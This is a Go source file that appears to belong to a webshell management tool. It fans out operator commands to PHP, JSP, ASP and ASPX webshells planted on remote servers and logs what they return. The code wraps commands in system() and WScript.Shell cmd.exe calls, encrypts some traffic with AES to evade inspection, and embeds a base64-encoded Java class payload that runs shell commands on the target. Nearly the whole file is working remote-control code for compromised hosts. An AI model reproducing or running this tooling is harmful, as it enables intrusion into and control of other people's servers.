package main

import (
	"bytes"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"net/http"
	neturl "net/url"
	"os"
	"strings"
)

func executeSomeCommands(command string) {
	for i, checkbox := range checkboxes {
		if checkbox.Checked {
			if i < len(connections) {
				conn := connections[i]
				fmt.Printf("Executing command on: %s - %s command is %s\n", conn.Type, conn.URL, command)
				switch conn.Type {
				case "PHP":
					go func() {
						executePHPcomands(conn.URL, conn.Password, command)
					}()
				case "JSP":
					go func() {
						executeJSPcomands(conn.URL, conn.Password, command)
					}()
				case "ASP":
					go func() {
						executeASPcomands(conn.URL, conn.Password, command)
					}()
				case "ASPX":
					go func() {
						executeASPXcomands(conn.URL, conn.Password, command)
					}()
				case "PHP+":
					go func() {
						executePHPEcomands(conn.URL, conn.Password, command)
					}()
				case "JSP+":
					go func() {
						executeJSPEcomands(conn.URL, conn.Password, command)
					}()
				case "ASPX+":
					go func() {
						executeASPXEcomands(conn.URL, conn.Password, command)
					}()
				default:

				}
			} else {
				fmt.Printf("Index %d out of range for connections\n", i)

			}
		}
	}

	w.SetContent(firstPage())
}

func executePHPcomands(url, password string, command string) string {

	if command == "" {
		return ""
	}

	wrappedCommand := fmt.Sprintf("system(\"%s\");", command)

	reqBody := fmt.Sprintf("%s=%s", password, wrappedCommand)

	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(reqBody))
	if err != nil {
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	displayText := string(body)

	detectedOS, _ = detectOs(url, password)

	if detectedOS == "Windows" {
		// 转换GBK编码到UTF-8
		utf8Body, _, err := transform.String(simplifiedchinese.GBK.NewDecoder(), string(body))
		if err != nil {

		}
		displayText = utf8Body
	} else {
		displayText = string(body)
	}

	output := fmt.Sprintf("URL: %s, PASSWORD: %s, COMMAND: %s\nThis is the output\n~~~~~~~~~~~~~~~\n%s\n~~~~~~~~~~~~~~~\n", url, password, command, displayText)
	// 将输出内容追加写入output.txt文件
	f, err := os.OpenFile("output.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return displayText
	}
	defer f.Close()

	if _, err := f.WriteString(output); err != nil {
		fmt.Println("Error writing to file:", err)
	}

	fmt.Printf("This is the test body:%s", displayText)

	return displayText

}

func executeJSPcomands(url, password string, command string) string {

	if command == "" {
		return ""
	}

	reqBody := fmt.Sprintf("%s=%s", password, command)

	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(reqBody))
	if err != nil {
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	displayText := string(body)

	detectedOS, _ = detectOs2(url, password)

	if detectedOS == "Windows" {
		// 转换GBK编码到UTF-8
		utf8Body, _, err := transform.String(simplifiedchinese.GBK.NewDecoder(), string(body))
		if err != nil {

		}
		displayText = utf8Body
	} else {
		displayText = string(body)
	}

	output := fmt.Sprintf("URL: %s, PASSWORD: %s, COMMAND: %s\nThis is the output\n~~~~~~~~~~~~~~~\n%s\n~~~~~~~~~~~~~~~\n", url, password, command, displayText)
	f, err := os.OpenFile("output.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return displayText
	}
	defer f.Close()

	if _, err := f.WriteString(output); err != nil {
		fmt.Println("Error writing to file:", err)
	}

	fmt.Printf("This is the test body:%s", displayText)

	return displayText

}

func executeASPcomands(url, password string, command string) string {

	if command == "" {
		return ""
	}

	reqBody := fmt.Sprintf("%s=%s", password, command)

	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(reqBody))
	if err != nil {
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	displayText := string(body)

	output := fmt.Sprintf("URL: %s, PASSWORD: %s, COMMAND: %s\nThis is the output\n~~~~~~~~~~~~~~~\n%s\n~~~~~~~~~~~~~~~\n", url, password, command, displayText)
	f, err := os.OpenFile("output.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return displayText
	}
	defer f.Close()

	if _, err := f.WriteString(output); err != nil {
		fmt.Println("Error writing to file:", err)
	}

	fmt.Printf("This is the test body:%s", displayText)

	return displayText

}

func executeASPXcomands(url, password string, command string) string {

	if command == "" {
		return ""
	}

	command = strings.ReplaceAll(command, `\`, `\\`)
	wrappedCommand := fmt.Sprintf("var shell = new ActiveXObject(\"WScript.Shell\"); var exec = shell.Exec(\"cmd.exe /c %s\"); var output = exec.StdOut.ReadAll();", command)

	reqBody := fmt.Sprintf("%s=%s", password, wrappedCommand)

	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBufferString(reqBody))
	if err != nil {
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	displayText := string(body)

	output := fmt.Sprintf("URL: %s, PASSWORD: %s, COMMAND: %s\nThis is the output\n~~~~~~~~~~~~~~~\n%s\n~~~~~~~~~~~~~~~\n", url, password, command, displayText)
	f, err := os.OpenFile("output.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return displayText
	}
	defer f.Close()

	if _, err := f.WriteString(output); err != nil {
		fmt.Println("Error writing to file:", err)
	}

	fmt.Printf("This is the test body:%s", displayText)

	return displayText

}

func executePHPEcomands(url, password string, command string) string {
	AESkey, sessionID = PHPEConnection1(url, password)

	command = fmt.Sprintf(`hello | system("%s");`, command)
	encrypted, err := encryptAES128ECB([]byte(command), []byte(AESkey))
	if err != nil {
	}

	postData := encrypted
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(postData)))
	if err != nil {
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cookie", sessionID)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
	}
	defer resp.Body.Close()

	postRespBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
	}
	if Osinfo == "Windows" {
		// 转换GBK编码到UTF-8
		utf8Body, _, err := transform.String(simplifiedchinese.GBK.NewDecoder(), string(postRespBody))
		if err != nil {
		}
		output := fmt.Sprintf("URL: %s, PASSWORD: %s, COMMAND: %s\nThis is the output\n~~~~~~~~~~~~~~~\n%s\n~~~~~~~~~~~~~~~\n", url, password, command, utf8Body)
		f, err := os.OpenFile("output.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
		}
		if _, err := f.WriteString(output); err != nil {
			fmt.Println("Error writing to file:", err)
		}
		fmt.Printf("This is the test body:%s", utf8Body)
		return utf8Body
	} else {
		fmt.Printf("This is the test body:%s", string(postRespBody))
		output := fmt.Sprintf("URL: %s, PASSWORD: %s, COMMAND: %s\nThis is the output\n~~~~~~~~~~~~~~~\n%s\n~~~~~~~~~~~~~~~\n", url, password, command, postRespBody)
		f, err := os.OpenFile("output.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
		}
		if _, err := f.WriteString(output); err != nil {
			fmt.Println("Error writing to file:", err)
		}
		return string(postRespBody)
	}

}

func executeJSPEcomands(url, password string, command string) string {

	if command == "" {
		return ""
	}

	command1 := base64Encode(command)

	partUrl := fmt.Sprintf("?Enco=base64&C1=L2Jpbi9zaA==&C2=%s", command1)
	targetUrl := url + partUrl
	fmt.Printf("fullURL:%s", targetUrl)
	data := neturl.Values{}
	data.Set(password, "yv66vgAAADcBKwoAQAB4CQBbAHkJAFsAegcAewoABAB8BwB9CgAEAH4HAH8KAEAAgAgAXAoAPQCBCgCCAIMKAIIAhAgAXgcAhQoADwCGCACHCwAGAIgIAIkJAFsAiggAiwgAjAkAWwCNBwCOCgAYAI8IAJALAAgAkQsABgCSCwAIAJIIAJMSAAAAlwoAWwCYCgBbAJkIAJoKAFsAmwoAGACcCgAYAJ0LAAgAngoAnwCgCgAPAJ0SAAEAlwgAogoALACjBwCkCgAsAKUKACwApggApwoALACoBwCpCgAsAKoKADEAqwoALACsCgAsAK0SAAIArwoAMQCwCgAxALEIALIIALMKAD0AtAgAtQcAtgoAPQC3CgA9ALgHALkKALoAuwcAvAcAvQgAvggAvwgAbQoAWwDACADBCADCCgDDAMQKAMMAxQoAxgDHCgBbAMgKAMYAyQgAygoAywDMCgAsAM0IAM4KACwAzwcA0AcA0QoAVQDSCgBUANMKAFQA1BIAAwCXCgBUANYHAG4BAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHZW5jb2RlcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEADVN0YWNrTWFwVGFibGUBAAJFQwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEABmRlY29kZQEAEkV4ZWN1dGVDb21tYW5kQ29kZQEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7BwDXAQAFaXNXaW4BAAMoKVoBAA9Db3B5SW5wdXRTdHJlYW0BADAoTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7KVYHANgBAApTb3VyY2VGaWxlAQAXRXhlY3V0ZUNvbW1hbmRDb2RlLmphdmEMAGMAZAwAXABdDABeAF8BAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAwA2QDaAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwA2wDcAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UMAN0A3gwA3wDgBwDhDADiAOMMAOQA5QEAE2phdmEvbGFuZy9FeGNlcHRpb24MAOYAZAEABEVuY28MAOcAawEAAAwAYABhAQAHY2hhcnNldAEABVVURi04DABiAGEBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyDABjAOgBAAl0ZXh0L2h0bWwMAOkA6AwA6gDoAQACQzEBABBCb290c3RyYXBNZXRob2RzDwYA6wgA7AwA7QBrDABtAGsMAGoAawEAAkMyDABuAG8MAO4A7wwA8ADxDADyAPMHAPQMAPUA6AgA9gEAA2hleAwAZwBoAQAQamF2YS9sYW5nL1N0cmluZwwA9wD4DABjAPkBABAwMTIzNDU2Nzg5QUJDREVGDAD6APEBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwA+wD8DABjAP0MAP4A/wwBAAEBCAECDADtAQMMAQQA/QwA8ABrAQAGYmFzZTY0AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgwBBQEGAQAMZGVjb2RlQnVmZmVyAQAPamF2YS9sYW5nL0NsYXNzDAEHAQgMAQkBCgEAEGphdmEvbGFuZy9PYmplY3QHAQsMAQwBDQEAAltCAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24BABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RGVjb2RlcgwAcQByAQACLWMBAAIvYwcBDgwBDwEQDAERARIHARMMARQBFQwAcwB0DAEWARUBAAdvcy5uYW1lBwEXDAEYAGsMARkA8QEAA3dpbgwBGgEbAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMAGMBHAwAYwEdDAEeAPEIAR8MASAAZAEAE1tMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAKZ2V0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAMZ2V0UGFyYW1ldGVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOc2V0Q29udGVudFR5cGUBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwoBIQEiAQABAQEAF21ha2VDb25jYXRXaXRoQ29uc3RhbnRzAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBAApFUlJPUjovLyABAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b1VwcGVyQ2FzZQEABmxlbmd0aAEAAygpSQEABChJKVYBAAZjaGFyQXQBAAQoSSlDAQAHaW5kZXhPZgEABChJKUkBAAMBASwBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL1N0cmluZzsBAAV3cml0ZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEADmdldEVycm9yU3RyZWFtAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQADAQ0KAQAFY2xvc2UHASMMAO0BJwEAJGphdmEvbGFuZy9pbnZva2UvU3RyaW5nQ29uY2F0RmFjdG9yeQcBKQEABkxvb2t1cAEADElubmVyQ2xhc3NlcwEAmChMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwEqAQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhAFsAQAAAAAQAAQBcAF0AAAABAF4AXwAAAAEAYABhAAAAAQBiAGEAAAAHAAEAYwBkAAEAZQAAAC8AAgABAAAADyq3AAEqAbUAAioBtQADsQAAAAEAZgAAAA4AAwAAAAoABAALAAkADAABAGcAaAABAGUAAALvAAQABgAAAbsrwQAEmQAhK8AABE0qLLYABcAABrUAAiostgAHwAAItQADpwCsK8EABpkAUiorwAAGtQACKrQAArYACRIKtgALTSwEtgAMLCq0AAK2AA3AAAZOLbYACRIOtgALOgQZBAS2AAwqGQQttgANwAAItQADpwBeTSy2ABCnAFYrwQAImQBPKivAAAi1AAMqtAADtgAJEg62AAtNLAS2AAwsKrQAA7YADcAACE4ttgAJEgq2AAs6BBkEBLYADCoZBC22AA3AAAa1AAKnAAhNLLYAECoqtAACEhG5ABICAMYAESq0AAISEbkAEgIApwAFEhO1ABQqKrQAAhIVuQASAgDGABEqtAACEhW5ABICAKcABRIWtQAXuwAYWRITtwAZTbsAGFkSE7cAGU4qtAADEhq5ABsCACq0AAIqtAAXuQAcAgAqtAADKrQAF7kAHQIAKioqtAACEh65ABICALoAHwAAtgAgtgAhOgQqKiq0AAISIrkAEgIAugAfAAC2ACC2ACE6BS0qGQQZBbYAI7YAJFcsLbYAJbYAJFcqtAADuQAmAQAstgAltgAnpwAUOgQtGQS2ACi6ACkAALYAJFcErAADADQAcABzAA8AigDGAMkADwEmAaUBqAAPAAIAZgAAAK4AKwAAABIABwATAAwAFAAXABUAIgAWACwAFwA0ABkAQQAaAEYAGwBSABwAXQAdAGMAHgBwACEAcwAfAHQAIAB4ACEAewAjAIIAJACKACYAlwAnAJwAKACoACkAswAqALkAKwDGAC4AyQAsAMoALQDOADAA8AAxARIAMgEcADMBJgA1ATEANgE+ADcBSwA4AWUAOQF/ADoBjAA7AZUAPAGlAD8BqAA9AaoAPgG5AEAAaQAAAFYACyX3AE0HAA8H9wBNBwAPBFwHAFv/AAEAAgcAWwcAQAACBwBbBwAsXwcAW/8AAQACBwBbBwBAAAIHAFsHACz/AJgABAcAWwcAQAcAGAcAGAABBwAPEAAAAGoAawACAGUAAABDAAQAAgAAAB4qtAAUEiq2ACuZAAUrsLsALFkrtgAtKrQAF7cALrAAAAACAGYAAAAKAAIAAABEAA4ARQBpAAAAAwABDgBsAAAABAABAA8AAABtAGsAAgBlAAABzQAGAAYAAAEVKrQAFBIqtgArmQCFK8YADCsSE7YAK5kABhITsBIvTSu2ADBMuwAxWSu2ADIFbLcAM04SEzoEAzYFFQUrtgAyogBIGQQsKxUFtgA0tgA1B3gsKxUFBGC2ADS2ADWAugA2AAA6BC0sKxUFtgA0tgA1B3gsKxUFBGC2ADS2ADWAtgA3hAUCp/+1LRIWtgA4sCq0ABQSObYAK5kAfAFNEjq4ADtOLRI8BL0APVkDEixTtgA+LbYAPwS9AEBZAytTtgBBwABCTacARE4SRLgAOzoEGQQSRQO9AD22AD4BA70AQLYAQToFGQW2AAkSRgS9AD1ZAxIsU7YAPhkFBL0AQFkDK1O2AEHAAEJNuwAsWSwSFrcALrArsAABAJwAxADHAEMAAgBmAAAAXgAXAAAASQAMAEoAGQBLABwATQAfAE4AJABPADIAUAA2AFEAQgBSAGQAUwCBAFEAhwBVAI4AVgCaAFcAnABZAKIAWgDEAF8AxwBbAMgAXADPAF0A5ABeAQgAYAETAGIAaQAAADoACBkC/wAcAAYHAFsHACwHACwHADEHACwBAAD6AE34AAb/ADgAAwcAWwcALAcAQgABBwBD+wBA+gAKAGwAAAAEAAEADwAAAG4AbwACAGUAAAC3AAQABgAAAEy7ABhZEhO3ABlOBr0ALFkDK1NZBCq2AEeaAAgSSKcABRJJU1kFLFM6BLgAShkEtgBLOgUqGQW2AEwttgBNKhkFtgBOLbYATS22ACWwAAAAAgBmAAAAGgAGAAAAZgAKAGcAKQBoADMAaQA9AGoARwBrAGkAAAA5AAL/ACAABAcAWwcALAcALAcAGAADBwBwBwBwAf8AAQAEBwBbBwAsBwAsBwAYAAQHAHAHAHABBwAsAGwAAAAEAAEADwAAAHEAcgABAGUAAABOAAIAAgAAABgST7gAUEwrtgBRTCsSUrYAU5kABQSsA6wAAAACAGYAAAAWAAUAAABvAAYAcAALAHEAFAByABYAcwBpAAAACAAB/AAWBwAsAAAAcwB0AAIAZQAAAIAABgAFAAAAM7sAVFm7AFVZKyq0ABe3AFa3AFc6BBkEtgBYWU7GABEsLboAWQAAtgAkV6f/6xkEtgBasQAAAAIAZgAAABYABQAAAHgAFQB5AB8AegAtAHwAMgB9AGkAAAAfAAL9ABUABwBU/wAXAAUHAFsHAHUHABgHACwHAFQAAABsAAAABAABAA8AAwB2AAAAAgB3ASYAAAAKAAEBJAEoASUAGQCUAAAAGgAEAJUAAQCWAJUAAQChAJUAAQCuAJUAAQDV")
	encodedData := data.Encode()

	req, err := http.NewRequest("POST", targetUrl, strings.NewReader(encodedData))
	if err != nil {
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	displayText := string(body)

	output := fmt.Sprintf("URL: %s, PASSWORD: %s, COMMAND: %s\nThis is the output\n~~~~~~~~~~~~~~~\n%s\n~~~~~~~~~~~~~~~\n", url, password, command, displayText)
	f, err := os.OpenFile("output.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return displayText
	}
	defer f.Close()

	if _, err := f.WriteString(output); err != nil {
		fmt.Println("Error writing to file:", err)
	}

	fmt.Printf("This is the test body:%s", displayText)

	return displayText

}

func executeASPXEcomands(url, password string, command string) string {

	if command == "" {
		return ""
	}

	command1 := command
	command1 = strings.ReplaceAll(command1, `\`, `\\`)

	command2 := fmt.Sprintf(`var shell = new ActiveXObject("WScript.Shell"); var exec = shell.Exec("cmd.exe /c %s"); var output = exec.StdOut.ReadAll();`, command1)

	AESkey, sessionID := ASPXE1Connection(url, password)

	fmt.Printf("This is AESkey:%s\n", AESkey)

	fmt.Println(command2)
	key := []byte(AESkey)

	data := []byte(command2)

	encrypted, err := encryptAES128ECB(data, key)
	if err != nil {
		fmt.Println("Error:", err)
		return "0"
	}

	fmt.Println("Encrypted (Base64):", encrypted)

	postURL := url

	response, err := postEncryptedData(postURL, encrypted, sessionID)
	if err != nil {
		fmt.Println("Error sending POST request:", err)
		return "0"
	}
	fmt.Printf("test resp:%s\n", string(response))
	displayText := string(response)
	output := fmt.Sprintf("URL: %s, PASSWORD: %s, COMMAND: %s\nThis is the output\n~~~~~~~~~~~~~~~\n%s\n~~~~~~~~~~~~~~~\n", url, password, command, displayText)
	f, err := os.OpenFile("output.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return displayText
	}
	defer f.Close()

	if _, err := f.WriteString(output); err != nil {
		fmt.Println("Error writing to file:", err)
	}

	fmt.Printf("This is the test body:%s", displayText)

	return displayText

}
